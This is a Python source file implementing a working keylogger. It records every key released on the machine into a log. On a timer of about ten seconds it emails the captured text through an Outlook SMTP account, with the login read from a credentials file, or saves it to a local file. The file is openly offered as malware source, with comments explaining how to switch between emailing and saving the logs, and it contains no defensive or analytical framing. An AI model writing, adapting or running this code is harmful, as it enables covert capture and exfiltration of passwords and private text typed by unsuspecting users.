import pynput
import keyboard
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
from threading import Timer
from datetime import datetime 

SEND_REPORT_EVERY = 10

def load_credentials(filename='credentials.txt'):
    credentials = {}
    with open(filename, 'r') as file:
        for line in file:
            key, value = line.strip().split('=')
            credentials[key] = value
    return credentials

# Load credentials
credentials = load_credentials()
EMAIL_ADDRESS = credentials['EMAIL_ADDRESS']
EMAIL_PASSWORD = credentials['EMAIL_PASSWORD']


class Keylogger :
    def __init__(self,interval,report_method = "email") :
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_date = datetime.now()
        self.end_date = datetime.now()
    
    def key_press(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def create_filename(self):
        start_date_str = str(self.start_date)[:7].replace(" ","_").replace(":","")
        end_date_str = str(self.end_date)[:-7].replace(" ","_").replace(":","")
        self.filename = f'keylog - {start_date_str}_{end_date_str}'
    
    def save_to_file(self):
        with open(f"{self.filename}.txt","w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def prepare_mail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        html = f"<p> {message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()
    
    def sendmail(self, email, password, message, verbose=1):
        server = smtplib.SMTP(host="smtp-mail.outlook.com",port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        server.quit()
        if verbose:
            print(f"{datetime.now()}) - Sent an email to {email} containing: {message}")

    def report(self):
        if self.log:
            self.end_date = datetime.now()
            self.create_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.save_to_file()
            print(f"[{self.filename}] - {self.log}")
            self.start_date = datetime.now()
        self.log = ""
        timer= Timer(interval = self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_date = datetime.now()
        keyboard.on_release(callback=self.key_press)
        self.report()
        print(f"{datetime.now()} - started keylogger")
        keyboard.wait()

if __name__=="__main__":
    # if you want keylogger to send to your mail
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want keylogger to store to the local files
    #keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()


